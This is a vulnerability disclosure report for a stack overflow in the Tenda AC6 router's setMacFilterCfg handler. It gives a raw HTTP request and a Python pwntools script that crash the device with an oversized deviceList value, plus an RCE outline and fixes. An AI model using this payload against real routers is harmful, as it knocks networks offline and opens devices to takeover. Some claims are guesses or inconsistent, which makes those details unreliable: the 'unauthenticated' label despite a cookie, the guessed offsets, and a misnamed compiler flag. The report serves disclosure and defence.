# CVE Submission: Stack-Based Buffer Overflow in Tenda AC6V1.0(firmware V15.03.05.19) setMacFilterCfg

## Summary
A stack-based buffer overflow vulnerability in the Tenda AC6V1.0 router (firmware V15.03.05.19) allows unauthenticated remote attackers to execute arbitrary code or cause denial of service (DoS) via the `deviceList` parameter in the `/goform/setMacFilterCfg` endpoint. The flaw resides in the `sub_BE73C` function (aliased as `parse_macfilter_rule`), which uses unsafe `strcpy` operations without bounds checking, enabling stack corruption.

## Details
- **Vendor**: Tenda
- **Product**: Tenda AC6V1.0 
- **Firmware Version**: V15.03.05.19
- **Firmware Download**: [https://tenda.com.cn/material/show/2681](https://tenda.com.cn/material/show/2681)
- **Component**: `/goform/setMacFilterCfg` (functions `formSetMacFilterCfg` and `sub_BE73C`)
- **Vulnerability Type**: Stack-Based Buffer Overflow (CWE-121)
- **CVE ID**: Pending
- **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)

## Description
The vulnerability exists in the `formSetMacFilterCfg` function, which processes HTTP POST requests to `/goform/setMacFilterCfg`. The `deviceList` parameter is passed to `sub_BD758` and then to `sub_BE73C` (parse_macfilter_rule), where it is split at a carriage return (`\r`, ASCII 13). The portion after `\r` is copied into a fixed-size buffer using `strcpy(a2, src)` without length validation. If the input exceeds the buffer size (likely 64 bytes, based on typical Tenda firmware structs), it overflows the stack, potentially overwriting return addresses or other critical data.

This allows attackers to:
- Cause a denial of service (DoS) by crashing the router.
- Achieve remote code execution (RCE) by crafting a payload with ROP gadgets to call functions like `system("/bin/sh")`, as demonstrated in similar CVEs.


## Proof of Concept (PoC)
The following PoC demonstrates the vulnerability by sending a 1000-byte cyclic payload to trigger a stack overflow, causing a router crash (DoS). A tailored ROP chain could achieve RCE.

### PoC: Denial of Service via Stack Overflow
```http
POST http://192.168.100.72/goform/setMacFilterCfg HTTP/1.1
Host: 192.168.100.72
Content-Length: [length]
Cookie: password=rfl1qw
Content-Type: application/x-www-form-urlencoded

macFilterType=black&deviceList=%0D[cyclic 1000-byte payload]
```
- **Steps**:
  1. Generate a 1000-byte cyclic payload using pwntools: `cyclic(1000)`.
  2. Send the request using `curl`, Burp Suite, or a similar tool, with `\r` URL-encoded as `%0D`.
  3. The router processes `deviceList`, triggering a stack overflow in `sub_BE73C` via `strcpy(a2, src)`.
- **Result**: The router's web server crashes, rendering the management interface unresponsive.

### PoC: Python Exploit Script
```python
from pwn import *
import requests

payload = cyclic(1000)  # 1000-byte cyclic pattern to overflow buffer
url = "http://192.168.100.72/goform/setMacFilterCfg"
cookie = {"Cookie": "password=rfl1qw"}
data = {"macFilterType": "black", "deviceList": b"\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)  # Double POST to bypass potential checks
print(response.text)
```
- **Steps**:
  1. Install pwntools (`pip install pwntools`).
  2. Configure the target IP (`192.168.100.72`) and cookie (`password=rfl1qw`).
  3. Run the script to send two POST requests with a 1000-byte payload prefixed by `\r`.
  4. The payload overflows the stack buffer, typically at an offset of ~472 bytes to the return address (based on similar Tenda exploits).
- **Result**: Router crash (DoS). With a crafted ROP chain, RCE is possible (e.g., executing `/bin/sh`).
- **Verification**: Monitor router unresponsiveness or analyze crash dumps with a debugger (e.g., GDB).


## Impact
- **Denial of Service (DoS)**: The oversized payload crashes the router’s web server, disrupting network connectivity and management access.
- **Remote Code Execution (RCE)**: With a crafted ROP chain, attackers can execute arbitrary commands, leading to:
  - Full device compromise (e.g., shell access).
  - Network traffic interception or manipulation (e.g., DNS hijacking).
  - Installation of persistent backdoors or malware.
  - Botnet recruitment.
- **Scope**: Affects all devices on the network, with potential for lateral attacks on connected clients or IoT devices.
- **Exploitation Requirements**: No authentication required if default credentials (`password=rfl1qw`) are unchanged, making the attack accessible remotely.

## Root Cause
The vulnerability arises in `sub_BE73C` due to the use of `strcpy` without bounds checking:
```c
strcpy(a2 + 32, a1);  // Copies name (before \r)
strcpy(a2, src);      // Copies MAC (after \r)
```
- The `deviceList` parameter is split at `\r`, and the portion after `\r` (`src`) is copied into a fixed-size buffer (`a2`, likely 64 bytes). A long input (e.g., 1000 bytes) overflows the stack, corrupting adjacent variables or the return address.
- No input validation occurs in `formSetMacFilterCfg` or `sub_BD758` to limit `deviceList` length or format.
- The double POST in the PoC may bypass session or state checks, ensuring the payload reaches `sub_BE73C`.

## Affected Versions
- Tenda AC6V1.0 V15.03.05.19
- Potentially other Tenda AC Series routers (e.g., AC1206, AC10) with similar firmware versions, pending verification.

## Mitigation
### Immediate Actions
1. **Restrict Access**:
   - Disable remote administration or restrict `/goform/setMacFilterCfg` to trusted IPs via firewall rules.
   - Change the default admin password (`rfl1qw`) to a strong, unique value.
2. **Monitor and Test**:
   - Check for router crashes or unauthorized access attempts in logs.
   - Test other Tenda models for similar vulnerabilities.
3. **Apply Updates**:
   - Check for firmware updates at [https://tenda.com.cn/material/show/2681](https://tenda.com.cn/material/show/2681).
   - Contact Tenda for a patch addressing this issue.

### Code Fixes
1. **Replace `strcpy` with `strncpy`**:
   ```c
   strncpy(a2 + 32, a1, 32);  // Limit name to 32 bytes
   a2[63] = '\0';             // Ensure null termination
   strncpy(a2, src, 32);      // Limit MAC to 32 bytes
   a2[31] = '\0';
   ```
2. **Validate Input Length**:
   ```c
   if (strlen(a1) >= 32 || strlen(src) >= 32) {
       return 2;  // Reject oversized input
   }
   ```
3. **Upper-Level Validation**:
   - In `formSetMacFilterCfg`, limit `deviceList` length:
     ```c
     if (strlen(v17) > 256) {
         v19 = 1;  // Reject long input
     }
     ```
4. **Enable Security Features**:
   - Compile firmware with stack-smashing protection (`-fstack-protect`).
   - Enable ASLR and DEP if supported by the router’s OS.

### Long-Term Recommendations
- **Secure Coding Practices**:
  - Avoid unsafe functions (`strcpy`, `sprintf`) in favor of `strncpy`, `snprintf`.
  - Implement strict input validation for all HTTP parameters (e.g., expect MAC addresses in `xx:xx:xx:xx:xx:xx` format).
- **Fuzz Testing**:
  - Regularly fuzz endpoints like `/goform/setMacFilterCfg` to identify similar vulnerabilities.
- **Remove Debug Output**:
  - Disable `printf` calls in `sub_BE73C` (e.g., for `cgi_debug`) in production to prevent information leakage.

## Disclosure Timeline
- **August 11, 2025**: Vulnerability discovered and PoC developed.
- **August 12, 2025**: Report prepared for submission to Tenda and MITRE.
- **TBD**: Vendor notified and response pending.
- **TBD**: Patch release and public disclosure per responsible disclosure policy.

## References
- **CVE-2025-7544**: Stack overflow in Tenda AC1206 `setMacFilterCfg`.
- **CVE-2022-28561**: Similar issue in Tenda AX12.
- **Tenda Firmware**: [https://tenda.com.cn/material/show/2681](https://tenda.com.cn/material/show/2681)
- **Pwntools Documentation**: [https://docs.pwntools.com/](https://docs.pwntools.com/)
- **MITRE CVE Submission Guide**: [https://cve.mitre.org/cve/request_id.html](https://cve.mitre.org/cve/request_id.html)

## Additional Notes
- The default cookie (`password=rfl1qw`) indicates weak authentication, exacerbating the vulnerability’s impact.
- The double POST request may bypass session or state validation, a common issue in Tenda firmware.
- RCE requires knowledge of the firmware’s memory layout (e.g., libc addresses), which may be static in Tenda devices, as seen in prior exploits.
- Other Tenda AC Series models (e.g., AC10, AC18) should be tested for similar flaws due to shared codebases.
